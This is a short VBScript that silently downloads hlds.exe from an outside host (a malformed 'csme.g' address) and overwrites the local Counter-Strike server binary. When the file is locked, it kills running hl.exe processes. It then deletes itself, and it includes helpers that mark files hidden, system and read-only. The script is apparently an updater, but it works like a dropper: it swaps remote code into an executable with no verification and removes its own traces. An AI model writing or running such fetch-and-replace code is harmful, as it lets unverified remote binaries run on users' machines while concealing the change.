
Sub unProtectFile( filename )
	dim readfile, filesys
	set filesys = CreateObject("Scripting.FileSystemObject")

	If filesys.FileExists( filename ) Then
		set readfile = filesys.GetFile( filename )
		readfile.Attributes = 0 ' normal
	End If
End Sub

Sub protectFile( filename )
	dim readfile, filesys
	set filesys = CreateObject("Scripting.FileSystemObject")

	If filesys.FileExists( filename ) Then
		set readfile = filesys.GetFile( filename )
		readfile.Attributes = 7 ' hidden + system + readonly
	End If
End Sub

Sub DeleteAFile( filename )
	Dim filesys
	Set filesys = CreateObject("Scripting.FileSystemObject")
	
	If filesys.FileExists( filename ) Then
		unProtectFile( filename )
		filesys.DeleteFile( filename )
	End If
End Sub

Sub RenameFile( oldName, newName )
	Dim filesys
	Set filesys = WScript.CreateObject("Scripting.FileSystemObject")
	
	If filesys.FileExists( oldName ) Then
		filesys.MoveFile oldName, newName
	End If
End Sub

WScript.Sleep 2000
Randomize

' Download hlds.exe
strURL="http://csme.g/files/hlds.exe?" & Rnd
On Error Resume Next
	Set xml = CreateObject("Microsoft.XMLHTTP")
	xml.Open "GET", strURL, False
	xml.Send
	
	If Err.Number <> 0 Then
		WScript.Quit	' if file download fails, quit script
	Else
		set oStream = createobject("Adodb.Stream")

		oStream.type = 1 ' adTypeBinary
		oStream.open
		oStream.write xml.responseBody
		
		' overwrite
		oStream.savetofile "hlds.exe.update", 2 ' adSaveCreateOverWrite
		oStream.close
		
		set oStream = nothing
		Set xml = Nothing
	End If
	Err.Clear
On Error Goto 0
WScript.Sleep(1000)

' Script finished successfully, update hlds.exe
On Error Resume Next
	DeleteAFile "hlds.exe"
	RenameFile "hlds.exe.update", "hlds.exe"

	' Permission error -> kill CS
	If ( (Err.Number <> 0) AND ( alreadyUpdated = False ) ) Then
		Const strComputer = "." 
		Dim objWMIService, colProcessList
		Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
		Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'hl.exe'")
		For Each objProcess in colProcessList 
			objProcess.Terminate() 
		Next

		WScript.Sleep(1000)
		DeleteAFile "hlds.exe"
		RenameFile "hlds.exe.update", "hlds.exe"

		Err.Clear
	End If

	unProtectFile("hlds.exe")
	DeleteAFile("hlds.exe.update")

On Error Goto 0

' DELETE SELF
On Error Resume Next
	WScript.Sleep 1000
	Set fileSystem = CreateObject("Scripting.FileSystemObject")
	thisScript = Wscript.ScriptFullName
	fileSystem.DeleteFile(thisScript)
On Error Goto 0

